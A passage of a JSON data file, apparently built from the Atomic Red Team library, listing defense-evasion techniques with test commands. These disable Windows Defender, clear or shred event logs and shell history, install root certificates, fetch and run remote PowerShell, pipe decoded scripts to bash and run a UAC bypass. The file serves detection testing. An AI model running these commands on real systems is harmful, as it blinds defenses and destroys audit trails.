            "command": "Set-MpPreference -DisableIntrusionPreventionSystem $true;\nSet-MpPreference -DisableIOAVProtection $true;\nSet-MpPreference -DisableRealtimeMonitoring $true;\nSet-MpPreference -DisableScriptScanning $true;\nSet-MpPreference -EnableControlledFolderAccess Disabled;\n"
         }
      ]
   },
   "T1070.001": {
      "technique_name": "Indicator Removal on Host: Clear Windows Event Logs",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Upon execution this test will clear Windows Event Logs. Open the System.evtx logs at C:\\Windows\\System32\\winevt\\Logs and verify that it is now empty.\n",
            "command": "wevtutil cl System"
         },
         {
            "description": "This module utilizes WMI via VBA to clear the Security and Backup eventlogs from the system. \n\nElevation is required for this module to execute properly, otherwise WINWORD will throw an \"Access Denied\" error\n",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); Invoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1070.001\\src\\T1070.001-macrocode.txt\" -officeProduct \"Word\" -sub \"ClearLogs\""
         },
         {
            "description": "Clear event logs using built-in PowerShell commands.\nUpon successful execution, you should see the list of deleted event logs\nUpon execution, open the Security.evtx logs at C:\\Windows\\System32\\winevt\\Logs and verify that it is now empty or has very few logs in it.\n",
            "command": "$logs = Get-EventLog -List | ForEach-Object {$_.Log}; $logs | ForEach-Object {Clear-EventLog -LogName $_ }; Get-EventLog -list"
         },
         {
            "description": "Clear Sysmon logs [intended to trigger CAR-2016-04-002]",
            "command": "Clear-Eventlog Security;\nClear-Eventlog System;\n"
         }
      ]
   },
   "T1027.002": {
      "technique_name": "Obfuscated Files or Information: Software Packing",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Copies and then runs a simple binary (just outputting \"the cake is a lie\"), that was packed by UPX.\n\nThe UPX magic number (`0x55505821`, \"`UPX!`\") was changed to (`0x4c4f5452`, \"`LOTR`\"). This prevents the binary from being detected\nby some methods, and especially UPX is not able to uncompress it any more.\n",
            "command": "cp 57a8ec_test_upx_header_changed /tmp/packed_bin && /tmp/packed_bin"
         },
         {
            "description": "Copies and then runs a simple binary (just outputting \"the cake is a lie\"), that was packed by UPX.\nNo other protection/compression were applied.\n",
            "command": "cp c92729_test_upx /tmp/packed_bin && /tmp/packed_bin"
         },
         {
            "description": "Copies and then runs a simple binary (just outputting \"the cake is a lie\"), that was packed by UPX.\nNo other protection/compression were applied.\n",
            "command": "cp 741a31_test_upx /tmp/packed_bin && /tmp/packed_bin"
         },
         {
            "description": "Copies and then runs a simple binary (just outputting \"the cake is a lie\"), that was packed by UPX.\n\nThe UPX magic number (`0x55505821`, \"`UPX!`\") was changed to (`0x4c4f5452`, \"`LOTR`\"). This prevents the binary from being detected\nby some methods, and especially UPX is not able to uncompress it any more.\n",
            "command": "cp cc5b6f_test_upx_header_changed /tmp/packed_bin && /tmp/packed_bin"
         }
      ]
   },
   "T1140": {
      "technique_name": "Deobfuscate/Decode Files or Information",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Use Python to decode a base64-encoded text string and echo it to the console\n",
            "command": "ENCODED=$(python3 -c 'import base64;enc=base64.b64encode(\"Hello from Atomic Red Team test T1140!\".encode());print(enc.decode())'); python3 -c \"import base64;dec=base64.b64decode(\\\"$ENCODED\\\");print(dec.decode())\"; python3 -c \"import base64 as d;dec=d.b64decode(\\\"$ENCODED\\\");print(dec.decode())\"; python3 -c \"from base64 import b64decode;dec=b64decode(\\\"$ENCODED\\\");print(dec.decode())\"; python3 -c \"from base64 import b64decode as d;dec=d(\\\"$ENCODED\\\");print(dec.decode())\"; echo $ENCODED | python3 -c \"import base64,sys;dec=base64.b64decode(sys.stdin.read());print(dec.decode())\"; echo $ENCODED > /tmp/T1140.encoded && python3 -c \"import base64;dec=base64.b64decode(open('/tmp/T1140.encoded').read());print(dec.decode())\""
         },
         {
            "description": "Use common shell utilities to decode a hex-encoded text string and echo it to the console\n",
            "command": "ENCODED=$(echo 'Hello from Atomic Red Team test T1140!' | xxd -ps -c 256); printf $ENCODED | xxd -r -p; echo $ENCODED | xxd -r -p; echo $(echo $ENCODED) | xxd -r -p; echo $ENCODED > /tmp/T1140.encoded && xxd -r -p /tmp/T1140.encoded; echo $ENCODED > /tmp/T1140.encoded && xxd -r -p < /tmp/T1140.encoded; echo $ENCODED > /tmp/T1140.encoded && cat /tmp/T1140.encoded | xxd -r -p; echo $ENCODED > /tmp/T1140.encoded && cat < /tmp/T1140.encoded | xxd -r -p"
         },
         {
            "description": "Encode/Decode executable\nUpon execution a file named T1140_calc_decoded.exe will be placed in the temp folder\n",
            "command": "certutil -encode C:\\Windows\\System32\\calc.exe %temp%\\T1140_calc.txt && certutil -decode %temp%\\T1140_calc.txt %temp%\\T1140_calc_decoded.exe"
         },
         {
            "description": "Rename certutil and decode a file. This is in reference to latest research by FireEye [here](https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html)\n",
            "command": "copy %windir%\\system32\\certutil.exe %temp%\\tcm.tmp && %temp%\\tcm.tmp -encode C:\\Windows\\System32\\calc.exe %temp%\\T1140_calc2.txt && %temp%\\tcm.tmp -decode %temp%\\T1140_calc2.txt %temp%\\T1140_calc2_decoded.exe"
         },
         {
            "description": "Use common shell utilities to decode a base64-encoded text string and echo it to the console\n",
            "command": "ENCODED=$(echo 'Hello from Atomic Red Team test T1140!' | base64); printf $ENCODED | base64 -d; echo $ENCODED | base64 -d; echo $(echo $ENCODED) | base64 -d; echo $ENCODED > /tmp/T1140.encoded && base64 -d /tmp/T1140.encoded; echo $ENCODED > /tmp/T1140.encoded && base64 -d < /tmp/T1140.encoded; echo $ENCODED > /tmp/T1140.encoded && cat /tmp/T1140.encoded | base64 -d; echo $ENCODED > /tmp/T1140.encoded && cat < /tmp/T1140.encoded | base64 -d; bash -c \"{echo,\\\"$(echo $ENCODED)\\\"}|{base64,-d}\""
         },
         {
            "description": "Using Linux Base64 Encoded shell scripts that have Shebang in them. This is commonly how attackers obfuscate passing and executing a shell script. Seen [here](https://www.trendmicro.com/pl_pl/research/20/i/the-evolution-of-malicious-shell-scripts.html) by TrendMicro, as well as [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS). Also a there is a great Sigma rule [here](https://github.com/SigmaHQ/sigma/blob/master/rules/linux/process_creation/proc_creation_lnx_base64_shebang_cli.yml) for it. \n",
            "command": "echo IyEvYmluL2Jhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash; echo IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash; echo IyEvYmluL2Rhc2gKZWNobyAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vQGF0b21pY3NvbmFmcmlkYXkgRlRXIgo= | base64 -d | bash; echo IyEvYmluL3NoCmVjaG8gImh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL0BhdG9taWNzb25hZnJpZGF5IEZUVyIK | base64 -d | bash"
         },
         {
            "description": "Use Perl to decode a base64-encoded text string and echo it to the console\n",
            "command": "ENCODED=$(perl -e \"use MIME::Base64;print(encode_base64('Hello from Atomic Red Team test T1140!'));\"); perl -le \"use MIME::Base64;print(decode_base64('$ENCODED'));\"; echo $ENCODED | perl -le 'use MIME::Base64;print(decode_base64(<STDIN>));'; echo $ENCODED > /tmp/T1140.encoded && perl -le 'use MIME::Base64;open($f,\"<\",\"/tmp/T1140.encoded\");print(decode_base64(<$f>));'"
         }
      ]
   },
   "T1218.010": {
      "technique_name": "Signed Binary Proxy Execution: Regsvr32",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.\n",
            "command": "IF \"%PROCESSOR_ARCHITECTURE%\"==\"AMD64\" (C:\\Windows\\syswow64\\regsvr32.exe /s bafdf3_AllTheThingsx86.dll) ELSE ( C:\\Windows\\system32\\regsvr32.exe /s bafdf3_AllTheThingsx86.dll )"
         },
         {
            "description": "Replicating observed Gozi maldoc behavior registering a dll with an altered extension\n",
            "command": "C:\\Windows\\system32\\regsvr32.exe /s %temp%\\shell32.jpg"
         },
         {
            "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.\n",
            "command": "C:\\Windows\\system32\\regsvr32.exe /s /u /i:\"4774cd_RegSvr32.sct\" scrobj.dll"
         },
         {
            "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. Normally, an install is executed with /n to prevent calling DllRegisterServer.",
            "command": "C:\\Windows\\system32\\regsvr32.exe /s /i \"bafdf3_AllTheThingsx86.dll\""
         },
         {
            "description": "Regsvr32.exe is a command-line program used to register and unregister OLE controls. This test may be blocked by windows defender; disable\nwindows defender real-time protection to fix it. Upon execution, calc.exe will be launched.\n",
            "command": "C:\\Windows\\system32\\regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll"
         }
      ]
   },
   "T1553.004": {
      "technique_name": "Subvert Trust Controls: Install Root Certificate",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Creates a root CA with Powershell\n",
            "command": "$cert = Import-Certificate -FilePath rootCA.cer -CertStoreLocation Cert:\\LocalMachine\\My; Move-Item -Path $cert.PSPath -Destination \"Cert:\\LocalMachine\\Root\""
         },
         {
            "description": "Creates a root CA with certutil\n",
            "command": "certutil -addstore my $env:Temp\\rootCA2.cer"
         },
         {
            "description": "Creates a root CA with openssl\n",
            "command": "if [ -f rootCA.crt ]; then : ; else if [ ! -f rootCA.key ]; then openssl genrsa -out rootCA.key 4096; fi; openssl req -x509 -new -nodes -key rootCA.key -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out rootCA.crt; fi;  ;  sudo security add-trusted-cert -d -r trustRoot -k \"/Library/Keychains/System.keychain\" \"rootCA.crt\""
         },
         {
            "description": "The following Atomic test simulates adding a generic non-malicious certificate to the CurrentUser certificate store. This behavior generates a registry modification that adds the cloned root CA certificate in the keys outlined in the blog.\nKeys will look like - \\SystemCertificates\\CA\\Certificates or \\SystemCertificates\\Root\\Certificates\nReference: https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec\n",
            "command": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing)"
         },
         {
            "description": "Creates a root CA with openssl\n",
            "command": "openssl genrsa -out rootCA.key 4096; openssl req -x509 -new -nodes -key rootCA.key -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out rootCA.crt; cp rootCA.crt /etc/pki/ca-trust/source/anchors/; update-ca-trust"
         },
         {
            "description": "Creates a root CA with openssl\n",
            "command": "if [ -f rootCA.crt ]; then : ; else if [ ! -f rootCA.key ]; then openssl genrsa -out rootCA.key 4096; fi; openssl req -x509 -new -nodes -key rootCA.key -sha256 -days 365 -subj \"/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com\" -out rootCA.crt; fi;  ;  mv rootCA.crt /usr/local/share/ca-certificates; echo sudo update-ca-certificates"
         }
      ]
   },
   "T1070.003": {
      "technique_name": "Indicator Removal on Host: Clear Command History",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Using a space before a command causes the command to not be logged in the Bash History file\n",
            "command": "hostname; whoami"
         },
         {
            "description": "Prevents Powershell history\n",
            "command": "Set-PSReadlineOption -HistorySaveStyle SaveNothing"
         },
         {
            "description": "Keeps history clear and stays out of lastlog,wtmp,btmp ssh -T keeps the ssh client from catching a proper TTY, which is what usually gets logged on lastlog\n",
            "command": "sshpass -p 'pwd101!' ssh testuser1@localhost -T hostname"
         },
         {
            "description": "Clears bash history via cat /dev/null\n",
            "command": "cat /dev/null > ~/.bash_history"
         },
         {
            "description": "Clears bash history via rm\n",
            "command": "echo \"\" > ~/.bash_history"
         },
         {
            "description": "Clears bash history via a symlink to /dev/null\n",
            "command": "ln -sf /dev/null ~/.bash_history"
         },
         {
            "description": "Clears bash history via truncate\n",
            "command": "truncate -s0 ~/.bash_history"
         },
         {
            "description": "Clears the history of a bunch of different shell types by setting the history size to zero\n",
            "command": "unset HISTFILE; export HISTFILESIZE=0; history -c"
         },
         {
            "description": "Clears Powershell history\n",
            "command": "Remove-Item (Get-PSReadlineOption).HistorySavePath"
         },
         {
            "description": "Clears bash history via rm\n",
            "command": "rm ~/.bash_history"
         },
         {
            "description": "Clears the history and disable bash history logging of the current shell and future shell sessions\n",
            "command": "set +o history; echo 'set +o history' >> ~/.bashrc; . ~/.bashrc; history -c"
         },
         {
            "description": "The \"AddToHistoryHandler\" receives the current command as the $line variable and then returns $true if \nthe line should be written to the history file. Here we simply return $false so nothing gets added to \nthe history file for the current session. \n",
            "command": "Set-PSReadLineOption -AddToHistoryHandler { return $false }"
         },
         {
            "description": "Stop terminal from logging history",
            "command": "> $HOME/.bash_history && unset HISTFILE\n"
         }
      ]
   },
   "T1222.002": {
      "technique_name": "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Changes a file or folder's permissions recursively using chmod and a specified numeric mode.\n",
            "command": "chmod -R 755 /tmp/AtomicRedTeam/atomics/T1222.002"
         },
         {
            "description": "Changes a file or folder's ownership and group information using chown.\n",
            "command": "chown"
         },
         {
            "description": "Changes a file or folder's ownership only recursively using chown.\n",
            "command": "chown -R root /tmp/AtomicRedTeam/atomics/T1222.002"
         },
         {
            "description": "Changes a file or folder's permissions using chmod and a specified numeric mode.\n",
            "command": "chmod 755 /tmp/AtomicRedTeam/atomics/T1222.002"
         },
         {
            "description": "Changes a file or folder's permissions using chmod and a specified symbolic mode.\n",
            "command": "chmod a+w /tmp/AtomicRedTeam/atomics/T1222.002"
         },
         {
            "description": "chowns a file to root using a c script\n",
            "command": "sudo /tmp/T1222002own 2a24e8_chown.c"
         },
         {
            "description": "Changes a file or folder's ownership and group information recursively using chown.\n",
            "command": "chown -R"
         },
         {
            "description": "Remove's a file's `immutable` attribute using `chattr`.\nThis technique was used by the threat actor Rocke during the compromise of Linux web servers.\n",
            "command": "chattr -i /var/spool/cron/root"
         },
         {
            "description": "Changes a file or folder's ownership only using chown.\n",
            "command": "chown root /tmp/AtomicRedTeam/atomics/T1222.002/T1222.002.yaml"
         },
         {
            "description": "Changes a file or folder's permissions recursively using chmod and a specified symbolic mode.\n",
            "command": "chmod -R a+w /tmp/AtomicRedTeam/atomics/T1222.002"
         },
         {
            "description": "chmods a file using a c script\n",
            "command": "/tmp/T1222002 /tmp/ T1222002"
         }
      ]
   },
   "T1070.002": {
      "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "This test deletes the system log file using osascript via \"do shell script\"(sh/bash by default) which in-turn spawns rm utility, requires admin privileges\n",
            "command": "osascript -e 'do shell script \"rm /var/log/system.log\" with administrator privileges'"
         },
         {
            "description": "The first sub-test deletes the journal files using rm utility in the \"/var/log/journal/\" directory and the second sub-test clears the journal by modifiying time period of logs that should be retained to zero.\n",
            "command": "sudo rm /var/log/journal/*; sudo journalctl --vacuum-time=0"
         },
         {
            "description": "This test finds and deletes the system log files within /var/log/ directory using various executions(rm, shred, unlink)\n",
            "command": "sudo find /var/log -name 'system.log.*' -exec rm {} \\; sudo find /var/log/ -name \"system.log.97.gz.*\" -exec shred -u -z -n 3 {} \\; sudo find /var/log/ -name \"system.log.98.gz.*\" -exec unlink {} \\"
         },
         {
            "description": "This test securely deletes the system log files individually and recursively using the srm utility.\nInstall srm using Homebrew with the command: brew install khell/homebrew-srm/srm\nRefer: https://github.com/khell/homebrew-srm/issues/1 for installation\n",
            "command": "sudo srm /var/log/system.log; sudo srm -r /var/log/"
         },
         {
            "description": "This test truncates the system log files using the truncate utility with (-s 0 or --size=0) parameter which sets file size to zero, thus emptying the file content\n",
            "command": "sudo truncate -s 0 /var/log/system.log; sudo truncate --size=0 /var/log/system.log"
         },
         {
            "description": "This test deletes the system log file using applescript using osascript via Finder application\nNote: The user may be prompted to grant access to the Finder application before the command can be executed successfully as part of TCC(Transparency, Consent, and Control) Framework.\nRefer: https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive\n",
            "command": "osascript -e 'tell application \"Finder\" to delete POSIX file \"/var/log/system.log\"'"
         },
         {
            "description": "This test deletes main log datastore, inflight log data, time-to-live data(TTL), fault and error content\n",
            "command": "sudo log erase --all; sudo log erase --ttl"
         },
         {
            "description": "The first sub-test truncates the log file to zero bytes via /dev/null and the second sub-test fills the log file with null bytes(zeroes) via /dev/zero, using cat utility\n",
            "command": "sudo cat /dev/null > /var/log/system.log; sudo dd if=/dev/zero bs=1000 count=5 of=/var/log/system.log"
         },
         {
            "description": "This test overwrites the contents of the log file with zero bytes(-z) using three passes(-n 3) of data, and then delete the file(-u) securely\n",
            "command": "sudo shred -u -z -n 3 /var/log/system.log"
         },
         {
            "description": "This test overwrites the specified log. This technique was used by threat actor Rocke during the exploitation of Linux web servers.\n",
            "command": "echo 0> /var/log/secure"
         },
         {
            "description": "This test reads real-time system log file and writes empty string to it, thus clearing the log file without tampering with the logging process\n",
            "command": "sudo log -f /var/log/system.log | : > /var/log/system.log"
         },
         {
            "description": "This test overwrites the contents of system log file with an empty string using echo utility\n",
            "command": "sudo echo '' > /var/log/system.log"
         },
         {
            "description": "Delete system and audit logs\n",
            "command": "sudo rm -rf /var/log/system.log; if [ -d /var/audit ] ; then sudo rm -rf /var/audit/20220725213300.202208110700021 ; fi"
         },
         {
            "description": "This test overwrites the Linux mail spool of a specified user. This technique was used by threat actor Rocke during the exploitation of Linux web servers.\n",
            "command": "echo 0> /var/spool/mail/root"
         },
         {
            "description": "This test deletes the system log file using unlink utility\n",
            "command": "sudo unlink /var/log/system.log"
         }
      ]
   },
   "T1553.005": {
      "technique_name": "Subvert Trust Controls: Mark-of-the-Web Bypass",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Executes LNK file document.lnk from AllTheThings.iso. Link file executes cmd.exe and rundll32 to in order to load and execute AllTheThingsx64.dll from the ISO which spawns calc.exe.\n",
            "command": "Mount-DiskImage -ImagePath \"C:\\Users\\puma-4\\Desktop\\053c10_AllTheThings.iso\" -StorageType ISO -Access ReadOnly; $keep = Get-Volume -FileSystemLabel \"AllTheThings\"; $driveLetter = ($keep | Get-Volume).DriveLetter; $instance = [activator]::CreateInstance([type]::GetTypeFromCLSID(\"{c08afd90-f2a1-11d1-8455-00a0c91f3880}\")); $instance.Document.Application.ShellExecute($driveLetter+\":\\document.lnk\",\"\",$driveLetter+\":\\\",$null,0)"
         },
         {
            "description": "Remove the Zone.Identifier alternate data stream which identifies the file as downloaded from the internet.\nRemoving this allows more freedom in executing scripts in PowerShell and avoids opening files in protected view.\n",
            "command": "Unblock-File -Path C:\\Users\\puma-4\\Desktop\\ReadMe.md"
         },
         {
            "description": "Mounts an ISO image downloaded from internet to evade Mark-of-the-Web and run hello.exe executable from the ISO. \nUpon successful execution, powershell will download the .iso from the Atomic Red Team repo, mount the image, and run the executable from the ISO image that will open command prompt echoing \"Hello, World!\". \nISO provided by:https://twitter.com/mattifestation/status/1398323532988399620 Reference:https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/,  ",
            "command": "Mount-DiskImage -ImagePath \"C:\\Users\\puma-4\\Desktop\\0f959a_FeelTheBurn.iso\" -StorageType ISO -Access ReadOnly; $keep = Get-Volume -FileSystemLabel \"TestIso\"; $driveLetter = ($keep | Get-Volume).DriveLetter; invoke-item \"$($driveLetter):\\hello.exe\""
         },
         {
            "description": "Mounts ISO image downloaded from internet to evade Mark-of-the-Web. Upon successful execution, powershell will download the .iso from the Atomic Red Team repo, and mount the image. The provided sample ISO simply has a Reports shortcut file in it. Reference: https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/\n",
            "command": "Mount-DiskImage -ImagePath \"C:\\Users\\puma-4\\Desktop\\5fad3e_T1553.005.iso\""
         }
      ]
   },
   "T1218.003": {
      "technique_name": "Signed Binary Proxy Execution: CMSTP",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Adversaries may invoke cmd.exe (or other malicious commands) by embedding them in the RunPreSetupCommandsSection of an INF file\n",
            "command": "cmstp.exe /s \"b27341_T1218.003_uacbypass.inf\" /au"
         },
         {
            "description": "Adversaries may supply CMSTP.exe with INF files infected with malicious commands\n",
            "command": "cmstp.exe /s \"0deff5_T1218.003.inf\""
         }
      ]
   },
   "T1070.008": {
      "technique_name": "Email Collection: Mailbox Manipulation",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Copies and deletes mail data on Windows\n",
            "command": "New-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -ItemType Directory -ErrorAction Ignore; Get-ChildItem -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore }; Remove-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore"
         },
         {
            "description": "Copies and deletes mail data on macOS\n",
            "command": "mkdir ~/Library/Mail/copy; cp -R ~/Library/Mail/* ~/Library/Mail/copy; rm -rf ~/Library/Mail/copy/*"
         },
         {
            "description": "Copies and deletes mail data on Linux\n",
            "command": "mkdir -p /var/spool/mail/copy; for file in /var/spool/mail/*; do   if [ \"$(basename \"$file\")\" != \"copy\" ];   then     cp -R \"$file\" /var/spool/mail/copy/;   fi; done; rm -rf /var/spool/mail/copy/*"
         },
         {
            "description": "Copies and modifies mail data on macOS\n",
            "command": "mkdir ~/Library/Mail/copy; cp -R ~/Library/Mail/* ~/Library/Mail/copy; echo \"Manipulated data\" > ~/Library/Mail/copy/manipulated.txt"
         },
         {
            "description": "Copies and modifies mail data on Windows\n",
            "command": "New-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -ItemType Directory -ErrorAction Ignore; Get-ChildItem -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore }; Get-ChildItem -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -File | ForEach-Object { Add-Content -Path $_.FullName -Value \"Modification for Atomic Red Test\" -ErrorAction Ignore }"
         },
         {
            "description": "Copies and modifies mail data on Linux\n",
            "command": "mkdir -p /var/spool/mail/copy; for file in /var/spool/mail/*; do   if [ \"$(basename \"$file\")\" != \"copy\" ];   then     cp -R \"$file\" /var/spool/mail/copy/;     if [ -f \"/var/spool/mail/copy/$(basename \"$file\")\" ]; then       echo \"Modification for Atomic Red Test\" >> \"/var/spool/mail/copy/$(basename \"$file\")\";     fi;   fi; done"
         }
      ]
   },
   "T1562.003": {
      "technique_name": "Impair Defenses: HISTCONTROL",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "An Adversary may clear, unset or redirect the history environment variable HISTFILE to prevent logging of commands to the history file after they log out of the system.\n\nNote: we don't wish to log out, so we are just confirming the value of HISTFILE. In this test we 1. echo HISTFILE 2. set it to /dev/null 3. confirm that HISTFILE is set to /dev/null.\n",
            "command": "TEST=$(echo $HISTFILE); echo $HISTFILE; export HISTFILE=\"/dev/null\"; if [ $(echo $HISTFILE) == \"/dev/null\" ]; then echo \"\\$HISTFILE is /dev/null\"; fi"
         },
         {
            "description": "Disables history collection in shells\n",
            "command": "export HISTCONTROL=ignoreboth; whoami"
         },
         {
            "description": "An attacker may clear the bash history cache and the history file as their last act before logging off to remove the record of their command line activities. \n\nIn this test we use the $HISTFILE variable throughout to 1. confirms the $HISTFILE variable is set 2. echo \"\" into it 3..5 confirm the file is empty 6 clear the history cache 7. confirm the history cache is empty. This is when the attacker would logoff.\n",
            "command": "cp $HISTFILE $HISTFILE.OLD; if ((${#HISTFILE[@]})); then echo $HISTFILE; fi; echo \"\" > $HISTFILE; if [ $(wc -c <$HISTFILE) -gt 1 ]; then echo \"$HISTFILE is larger than 1k\"; fi; ls -la $HISTFILE ; cat $HISTFILE; history -c ; if [ $(history |wc -l) -eq 1 ]; then echo \"History cache cleared\"; fi"
         },
         {
            "description": "An Adversary may take advantage of the HISTIGNORE environment variable either to ignore particular commands or all commands. \n\nIn this test we 1. set HISTIGNORE to ignore ls, rm and ssh commands 2. clear this history cache 3..4 execute ls commands 5. confirm that the ls commands are not in the history cache 6. unset HISTIGNORE variable 7.. same again, but ignoring ALL commands.\n",
            "command": "if ((${#HISTIGNORE[@]})); then echo \"\\$HISTIGNORE = $HISTIGNORE\"; else export HISTIGNORE='ls*:rm*:ssh*'; echo \"\\$HISTIGNORE = $HISTIGNORE\"; fi; history -c ; ls -la $HISTFILE; ls -la ~/.bash_logout; if [ $(history |wc -l) -eq 1 ]; then echo \"ls commands are not in history\"; fi; unset HISTIGNORE; if ((${#HISTIGNORE[@]})); then echo \"\\$HISTIGNORE = $HISTIGNORE\"; else export HISTIGNORE='*'; echo \"\\$HISTIGNORE = $HISTIGNORE\"; fi; history -c ; whoami; groups; if [ $(history |wc -l) -eq 0 ]; then echo \"History cache is empty\"; fi"
         },
         {
            "description": "An attacker may exploit the space before a command (e.g. \" ls\") or the duplicate command suppression feature in Bash history to prevent their commands from being recorded in the history file or to obscure the order of commands used. \n\nIn this test we 1. sets $HISTCONTROL to ignoreboth 2. clears the history cache 3. executes ls -la with a space in-front of it 4. confirms that ls -la is not in the history cache 5. sets $HISTCONTROL to erasedups 6. clears the history cache 7..9 executes ls -la $HISTFILE 3 times 10. confirms that their is only one command in history\n",
            "command": "TEST=$(echo $HISTCONTROL); if [ \"$HISTCONTROL\" != \"ignoreboth\" ]; then export HISTCONTROL=\"ignoreboth\"; fi; history -c ; ls -la $HISTFILE; if [ $(history |wc -l) -eq 1 ]; then echo \"ls -la is not in history cache\"; fi; if [ \"$HISTCONTROL\" != \"erasedups\" ]; then export HISTCONTROL=\"erasedups\"; fi; history -c ; ls -la $HISTFILE; ls -la $HISTFILE; ls -la $HISTFILE; if [ $(history |wc -l) -eq 2 ]; then echo \"Their is only one entry for ls -la $HISTFILE\"; fi"
         },
         {
            "description": "An Adversary may set the bash history files size environment variable (HISTFILESIZE) to zero to prevent the logging of commands to the history file after they log out of the system.\n\nNote: we don't wish to log out, so we are just confirming the value of HISTFILESIZE. In this test we 1. echo HISTFILESIZE 2. set it to zero 3. confirm that HISTFILESIZE is set to zero.\n",
            "command": "TEST=$(echo $HISTFILESIZE); echo $HISTFILESIZE; export HISTFILESIZE=0; if [ $(echo $HISTFILESIZE) -eq 0 ]; then echo \"\\$HISTFILESIZE is zero\"; fi"
         }
      ]
   },
   "T1027": {
      "technique_name": "Obfuscated Files or Information",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Mimic execution of compressed executable. When successfully executed, calculator.exe will open.\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\temp_T1027.zip\\T1027.exe\""
         },
         {
            "description": "Stores base64-encoded PowerShell code in the Windows Registry and deobfuscates it for execution. This is used by numerous adversaries and malicious tools.\n\nUpon successful execution, powershell will execute encoded command and read/write from the registry.\n",
            "command": "$OriginalCommand = 'Write-Host \"Hey, Atomic!\"'; $Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand); $EncodedCommand =[Convert]::ToBase64String($Bytes); $EncodedCommand; Set-ItemProperty -Force -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion -Name Debug -Value $EncodedCommand; powershell.exe -Command \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\\Microsoft\\Windows\\CurrentVersion Debug).Debug)))\""
         },
         {
            "description": "Creates a base64-encoded data file and decodes it into an executable shell script\n\nUpon successful execution, sh will execute art.sh, which is a base64 encoded command, that echoes `Hello from the Atomic Red Team` \nand uname -v\n",
            "command": "cat /tmp/encoded.dat | base64 -d > /tmp/art.sh; chmod +x /tmp/art.sh; /tmp/art.sh"
         },
         {
            "description": "Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using HTTP.\nSensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.\n",
            "command": "Invoke-WebRequest -Uri 127.0.0.1 -Method POST -Body \"9070cd_T1027-cc-macro.xlsm\""
         },
         {
            "description": "Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using email.\nSensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.\n",
            "command": "Send-MailMessage -From"
         },
         {
